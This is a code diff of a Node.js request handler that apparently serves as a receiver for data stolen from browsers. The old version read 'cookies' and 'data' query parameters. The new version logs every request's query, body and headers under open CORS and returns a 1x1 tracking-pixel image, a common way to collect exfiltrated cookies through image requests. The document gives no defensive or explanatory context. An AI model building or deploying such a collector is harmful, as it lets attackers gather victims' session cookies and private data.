@@ -1,4 +1,12 @@
 module.exports = function handler(req, res) {
+    // Log everything first
+    console.log('=== INCOMING REQUEST ===');
+    console.log('Method:', req.method);
+    console.log('Query:', req.query);
+    console.log('Body:', req.body);
+    console.log('Headers:', req.headers);
+    console.log('========================');
+    
     // Add CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -9,29 +17,14 @@ module.exports = function handler(req, res) {
         return;
     }
     
+    // Handle all GET requests
     if (req.method === 'GET') {
-        const cookies = req.query.cookies;
-        const data = req.query.data;
+        console.log('GET request received with query:', req.query);
         
-        if (data) {
-            console.log('Received all data:', data);
-            try {
-                const parsedData = JSON.parse(data);
-                console.log('Parsed data:', parsedData);
-            } catch (e) {
-                console.log('Raw data:', data);
-            }
-        }
-        
-        if (cookies) {
-            console.log('Received cookies:', cookies);
-        }
-        
-        res.status(200).json({ message: 'Data received!' });
-    } else if (req.method === 'POST') {
-        console.log('Received data:', req.body);
-        res.status(200).json({ message: 'Data received successfully!' });
+        // Return a 1x1 pixel image for image requests
+        res.setHeader('Content-Type', 'image/png');
+        res.status(200).send(Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64'));
     } else {
-        res.status(405).json({ message: 'Method not allowed' });
+        res.status(200).json({ message: 'Request received' });
     }
 };
